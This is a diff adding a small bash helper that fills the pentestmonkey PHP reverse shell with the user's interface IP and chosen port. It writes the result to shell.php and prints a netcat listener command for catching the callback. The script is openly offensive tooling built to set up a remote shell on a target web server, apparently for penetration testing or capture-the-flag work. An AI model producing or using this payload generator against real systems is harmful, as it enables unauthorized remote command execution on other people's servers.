@@ -1,0 +1,16 @@
+#!/bin/bash
+#Quick Edit of github.com/pentestmonkey/php-reverse-shell to add your IP and chosen port using selected interface 
+#Example: phpshell eth0 443
+
+port="${2:-9090}"
+
+if [[ -z $1 ]]; then 
+
+	printf "Please add Interface optional port to set as Host IP; Default port 9090: phpshell eth0 443 "
+
+else
+
+	LHOST=$(ifconfig "$1" | grep -win 'inet' | cut -d " " -f 10)
+	sed -e "s/127.0.0.1/$LHOST/g" -e "s/1234/$port/g" /usr/share/webshells/php/php-reverse-shell.php > ./shell.php
+	echo "netcat -nlvp $LHOST $port"
+fi
